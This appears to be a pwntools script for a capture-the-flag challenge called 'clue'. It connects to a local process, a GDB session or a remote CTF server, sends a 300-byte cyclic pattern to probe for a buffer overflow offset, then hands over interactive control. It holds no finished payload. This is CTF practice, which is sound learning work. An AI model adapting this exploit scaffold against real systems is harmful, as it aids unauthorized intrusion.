#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("clue")
libc = ELF("./libc-2.31.so")

context.binary = exe

def conn():
    if args.REMOTE:
        p = remote("pwn.ctf.umasscybersec.org", 9005)
    else:
        if args.GDB:
            p = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            b *main+2843
            """)
        else:
            p = process([exe.path])
    return p


def main():
    p = conn()

    g = cyclic_gen(n=8)
    payload = g.get(300)
    p.sendline(payload)
    p.sendline(b"go north")

    p.interactive()


if __name__ == "__main__":
    main()
